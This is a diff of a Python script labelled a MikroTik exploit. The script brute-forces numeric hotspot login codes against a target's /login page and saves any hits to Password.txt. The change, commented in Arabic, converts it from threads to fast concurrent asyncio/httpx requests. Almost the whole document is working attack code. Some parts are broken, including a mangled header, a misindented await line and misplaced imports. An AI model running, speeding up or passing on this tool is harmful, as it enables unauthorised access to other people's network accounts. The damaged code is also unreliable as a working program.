@@ -1,6 +1,4 @@
-#!/usr/bin/python3
-# coding=utf-8
-# *******************************************************************
+*************************
 # *** (EX-818-M) Exploit 818 Mikrotik ***
 # * Version:
 #   v1.1
@@ -29,7 +27,7 @@ try:
 except ImportError:
     print("[!] Error import 'requests' model")
     exit()
-    
+
 
 
 def write(M, T):
@@ -60,128 +58,146 @@ def URL_CLEAR(*args, **kwargs):
 
 
 def _WRITE_PASSWORD(*args, **kwargs):
-    _FILE_ = open(os.path.join(os.getcwd(),'Password.txt'), 'a')  
-    _FILE_.write(f"\n{'+'*5} Mr.MHM {'+'*5}\nPASSWORD: {args[0]}\n")
+    _FILE_ = open(os.path.join(os.getcwd(), 'Password.txt'), 'a')
+    _FILE_.write(f"\n{'+'*5} Mr.WHM {'+'*5}\nPASSWORD: {args[0]}\n")
+    
     _FILE_.close()
 
+# نقوم بإنشاء قفل خاص بالطباعة لضمان عدم تداخل النصوص أثناء مسح الشاشة
+print_lock = asyncio.Lock()
 
 
-def _INDEX(*args, **kwargs):
-    os.system("clear")
-    _PRINT(f"[ {Y}===>{N} ] Find {W}{args[3]}{N} Passwords and write in {os.getcwd()}/Password.txt ^^\n") if int(args[3]) > 0 else ""
+async def _INDEX(*args, **kwargs):
+    # استخدام القفل لكي يقوم كل مسار بتحديث الشاشة بالترتيب وبدون فوضى
+    async with print_lock:
+        os.system("clear")
 
-    _P = (f"""    {R}[{N}    {args[0] + 1}    {R}]{N}
-[{B} * {N}] SIZE     : {args[1].headers['Content-Length']} Bytes
-[{B} * {N}] URL      : {URL_CLEAR(args[1].url)}
-[{B} * {N}] P
-ASSWORD : {args[2]}
-[{B} * {N}] TIMEOUT  : {args[1].elapsed.total_seconds()}\n\n\n--- Enter Ctrl+C for (exit) ---""")
-    return _PRINT(_P)
+        # قراءة الحجم بأمان وبحروف صغيرة لتوافق httpx
+        content_length = args[1].headers.get('content-length', '0')
 
+        # حساب الوقت المستغرق للطلب
+        try:
+            timeout_seconds = args[1].elapsed.total_seconds()
+        except Exception:
+            timeout_seconds = "0.0"
 
+        _PRINT(f"[ {Y}===>{N} ] Find {W}{args[3]}{N} Passwords and write in log\n")
 
-def _REQUESTS_SU(*args, **kwargs):
-    global _S
+        _P = (f"""    {R}[{N}    {args[0] + 1}    {R}]{N}
+[{B} * {N}] SIZE     : {content_length} Bytes
+[{B} * {N}] URL      : {URL_CLEAR(str(args[1].url))}
+[{B} * {N}] PASSWORD : {args[2]}
+[{B} * {N}] TIMEOUT  : {timeout_seconds}\n\n\n--- Enter Ctrl+C for (exit) ---""")
 
-    HOST, PASSWIRD = args
-
-    _S = requests.Session()
-    _S.headers['User-Agent'] = _USER_AGENT(randint(0,10))
-
-    _DATA = {"username": str(PASSWIRD)}
-
-    try:
-
-        _GET = _S.post(url=f"http://{HOST}/login", data=_DATA)
-
-    except:
-        _PRINT(f"[{R} - {N}] Sorry ERROR For Connection !!")
-        sys.exit(0)
-
-
-    return _GET
+        _PRINT(_P)
 
 
 
 
 
-# تعريف المتغيرات المشتركة والقفل لضمان عدم التداخل بين المسارات
-lock = threading.Lock()
+
+
+
+
+import asyncio
+import httpx
+from random import randint
+import sys
+
+# متغيرات عامة للتحكم في الحسابات والفحص
 _A_global = 0
 FIND_global = 0
 PROCESS_SIZE_global = 0
 _R_global = True
 
-def _PROCESS_SINGLE_PASSWIRD(HOST, PASSWIRD):
+# دالة الفحص لكل باسوورد (تعمل بشكل غير متزامن بالكامل)
+async def _PROCESS_SINGLE_PASSWIRD(client, HOST, PASSWIRD):
     global _A_global, FIND_global, PROCESS_SIZE_global, _R_global
-    
-    # 1. إرسال الطلب بشكل منفصل داخل المسار لتسريع العملية
-    DATA = _REQUESTS_SU(HOST, PASSWIRD)
-    
-    # 2. حماية المتغيرات المشتركة أثناء تقييمها
-    with lock:
-        if _R_global is True:
-            try:
-                PROCESS_SIZE_global = int(DATA.headers['Content-Length'])
-            except KeyError:
-                pass
-            _R_global = False
-        
-        # التقاط القيم الحالية للمسار الحالي لتمريرها لدالة _INDEX لاحقاً
-        current_process_size = PROCESS_SIZE_global
-        current_A = _A_global
-        current_find = FIND_global
-        
-        # زيادة العداد _A لكل محاولة
-        _A_global += 1
 
-    # 3. التحقق من شروط النجاح الخاصة بك
+    # تحضير الـ User-Agent العشوائي لكل طلب كما في كودك الأصلي
+    headers = {'User-Agent': _USER_AGENT(randint(0, 10))}
+    _DATA = {"username": str(PASSWIRD)}
+
     try:
-        content_length = int(DATA.headers['Content-Length'])
-        status_code = int(DATA.status_code)
-        
+        # إرسال طلب POST بشكل غير متزامن (بديل لـ _S.post)
+        # نرسل البيانات عبر data والأقسام الأخرى عبر headers
+        response = await client.post(url=f"http://{HOST}/login", data=_DATA, headers=headers)
+
+    except Exception:
+        # في حال فشل الاتصال، نطبع رسالة الخطأ الخاصة بك
+        _PRINT(f"[{R} - {N}] Sorry ERROR For Connection !!")
+        # في نظام asyncio لا نستخدم sys.exit لأنها تقتل السكربت بالكامل، بل نكتفي بالخروج من المحاولة الحالية
+        return
+
+    # إدارة المتغيرات العامة والأحجام بطريقة متزامنة ذكية
+    if _R_global is True:
+        try:
+            PROCESS_SIZE_global = int(response.headers.get('Content-Length', 0))
+        except (KeyError, ValueError):
+            pass
+        _R_global = False
+
+    current_process_size = PROCESS_SIZE_global
+    current_A = _A_global
+    current_find = FIND_global
+
+    _A_global += 1
+
+    try:
+        content_length = int(response.headers.get('Content-Length', 0))
+        status_code = response.status_code
+
+        # التحقق من شروط النجاح الخاصة بك
         if content_length < current_process_size and status_code == 200:
             if current_process_size - content_length > 3000:
-                _S.get(url=f"http://{HOST}/logout")
-                _S.delete(url=f"http://{HOST}/login")                    
+                # إرسال طلبات تسجيل الخروج وحذف الجلسة بشكل غير متزامن
+                await client.get(url=f"http://{HOST}/logout", headers=headers)
+                await client.delete(url=f"http://{HOST}/login", headers=headers)
                 _WRITE_PASSWORD(PASSWIRD)
-                
-                # استخدام القفل مرة أخرى لأننا نعدل متغيرات مشتركة
-                with lock:
-                    _R_global = True
-                    FIND_global += 1
-                    current_find = FIND_global # تحديث القيمة لدالة الفهرسة
 
-        # 4. استدعاء الفهرسة كما هي في كودك
-        _INDEX(current_A, DATA, PASSWIRD, current_find)
-        
+                _R_global = True
+                FIND_global += 1
+                current_find = FIND_global
+
+        # استدعاء دالة الفهرسة المعتمدة لديك (نمرر response بدلاً من DATA)
+      await _INDEX(current_A, response, PASSWIRD, current_find)
+
     except Exception:
-        # تجاوز الأخطاء الناتجة عن انقطاع الاتصال أو غياب Content-Length
         pass
 
 
-def _PROCESS_DATA(*args, **kwargs):
-    HOST, MINNUM, MAXNUM = args
-
-    ZERO = True if str(MINNUM).startswith("0") is False else False
-
-    # تصفير المتغيرات العامة مع كل استدعاء جديد للوظيفة
+# الدالة الأساسية لتوزيع المهام على الـ Async Engine
+async def _ASYNC_PROCESS_DATA(HOST, MINNUM, MAXNUM):
     global _A_global, FIND_global, PROCESS_SIZE_global, _R_global
     _A_global = 0
     FIND_global = 0
     PROCESS_SIZE_global = 0
     _R_global = True
 
-    # عدد العمليات المتوازية (المسارات). يمكنك رفع الرقم لتسريع أكبر إذا كان اتصالك والسيرفر يتحملان.
-    MAX_WORKERS = 10
+    ZERO = True if str(MINNUM).startswith("0") is False else False
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+    # تحديد حدود الاتصالات المتزامنة (مثلاً 20 طلباً في نفس الجزء من الثانية)
+    limits = httpx.Limits(max_keepalive_connections=20, max_connections=50)
+
+    # إنشاء عميل اتصال غير متزامن واحد يدير كل الطلبات بكفاءة عالية
+    async with httpx.AsyncClient(limits=limits, timeout=5.0) as client:
+        tasks = []
         for PASSWIRD in range(int(MINNUM), int(MAXNUM)):
-            # تنسيق الباسورد تماماً كما تفعل في الكود الأصلي
             formatted_password = PASSWIRD if ZERO is True else f"0{PASSWIRD}"
-            
-            # رمي المهمة للـ ThreadPool لتعمل بالتوازي مع المهام الأخرى
-            executor.submit(_PROCESS_SINGLE_PASSWIRD, HOST, formatted_password)
+
+            # تجهيز المهمة في الخلفية دون انتظار
+            task = asyncio.create_task(_PROCESS_SINGLE_PASSWIRD(client, HOST, formatted_password))
+            tasks.append(task)
+
+        # إطلاق جميع العمليات دفعة واحدة وبسرعة قصوى
+        await asyncio.gather(*tasks)
+
+
+# الدالة الرئيسية التي تستبدل دالتك القديمة تماماً وتوافق الكلاس الخاص بك
+def _PROCESS_DATA(*args, **kwargs):
+    HOST, MINNUM, MAXNUM = args
+    # تشغيل محرك asyncio
+    asyncio.run(_ASYNC_PROCESS_DATA(HOST, MINNUM, MAXNUM))
 
 
 def _SERVER_SYS(*args, **kwargs):
